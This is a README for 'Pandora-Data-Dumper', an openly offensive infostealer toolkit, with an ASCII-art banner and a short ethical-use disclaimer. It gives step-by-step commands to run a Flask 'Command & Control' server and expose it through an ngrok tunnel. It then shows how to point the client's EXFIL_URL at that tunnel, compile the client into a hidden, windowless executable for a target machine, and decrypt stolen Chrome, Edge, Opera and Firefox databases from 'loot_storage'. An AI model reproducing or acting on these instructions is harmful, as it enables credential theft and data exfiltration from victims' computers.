# Pandora-Data-Dumper v1.0.0
File and Data Dumper

```text
==================================================================================================
              8888888b.                            888                              
              888   Y88b                           888                              
              888    888                           888                              
              888   d88P 8888b.  88888b.   .d8888b.888  .d8888b.  888d888 8888b.    
              8888888P"     "88b 888 "88b  d88"   8888 d88"   88b 888P"      "88b   
              888       .d888888 888  888  888    8888 888    888 888    .d888888   
              888       888  888 888  888  Y88b  d8888 Y88b  d88P 888    888  888   
              888       "Y888888 888  888  "Y8888P"888  "Y8888P"  888    "Y888888   

                    ::: Aplication Development by ✘ 𝘼𝙠𝙞_SystemDown® ©2026 :::
==================================================================================================
           ______
        .-"      "-.
       /            \
      |              |       -----------------------------------------------------
      |,  .-.  .-.  ,|       Status:          > System Injection successful <
      | )(__/  \__)( |                        > System Online 🟢 <
      |/     /\     \|       Description:     > Pandora Data Dumper <
      (_     ^^     _)                        
       \__|IIIIII|__/        Version:         1.0.0
        | \IIIIII/ |         Author:          AKI_SystemDown® / Pandora® ©2026
        \          /         "Curiosity didn't kill the cat; it unlocked the box."
         `--------´          -----------------------------------------------------
         
    ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗██████╗  ██████╗ ██╗    ██╗███╗   ██╗
    ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗██║    ██║████╗  ██║
    ███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
    ╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║██║  ██║██║   ██║██║███╗██║██║╚██╗██║
    ███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
    ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
    
==================================================================================================

        ==================================================================================
                                           DISCLAIMER
        ==================================================================================
          This software is provided for EDUCATIONAL and ETHICAL TESTING purposes only.   
          The author (Pandora-Script) shall NOT be held responsible for any misuse,      
          damage, or illegal activities caused by this program.                          
    
          Use this tool only on systems you own or have explicit permission to test.
          Unauthorized access to computer systems is illegal in most jurisdictions.
    
          BY USING THIS SOFTWARE, YOU AGREE TO TAKE FULL RESPONSIBILITY FOR YOUR ACTIONS.
        ==================================================================================
```
# ​🛠️ Installation & Setup
​
## 1. Server Setup (Your Machine)
​The server acts as the "Command & Control" (C2) center to receive incoming data packets.

1.1. Install dependencies:

```text
pip install flask tabulate colorama
```

1.2. Start the server:

```text
python server.py
```

1.3. Make a Onefile exe-file:

```text
python -m PyInstaller --oneflle --name "Pandora Server" server.py
```

The server runs on port 3000 by default.

## 2. Ngrok Tunnel (Public Access)
​To allow the client to send data over the internet to your local machine:

2.1. Download and install Nrog.

2.2. Authenticate your account: ```ngrok config add-authtoken YOUR_TOKEN_HERE```

2.3. Start the tunnel:

```text
ngrok http 3000
```

2.4. Copy the Forwarding URL (e.g., https://random-id.ngrok-free.dev).

2.5. Update Client: Open ```client.py``` and replace ```EXFIL_URL``` with your Ngrok URL (keep the ```/upload``` suffix).

## 3. Compiling the Client to EXE (Target Machine)
​To convert the ```client.py``` into a standalone Windows executable:

3.1. Install Build Tools:

```text
pip install pyinstaller pycryptodome pypiwin32 requests
```

3.2. Generate EXE:
Run the following command to create a single, hidden (windowless) file:

```text
python -m PyInstaller --noconsole --onefile --icon=ICON.ico --name "Pandora Client" client.py
```

3.3. Your executable will be located in the dist/ folder.

## 4. chrome, EDGE Opera Decryption
​The stolen browser databases are encrypted. To read them:

4.1. ​Extract the .db file and the .key file from the received ZIP in loot_storage.

​4.2. Open decrypt.py.

​4.3. Paste the Master Key into ```MASTER_KEY_BASE64``` and set the ```DB_FILE```path.

​4.4. Run: ```python decrypt.py```

## 5. Firefox Decryption
​The stolen browser databases are encrypted. To read them:

5.1. ​Extract the .db file and the .key file from the received ZIP in loot_storage.

​5.2. Run: ```python firefox_decrypt.py```
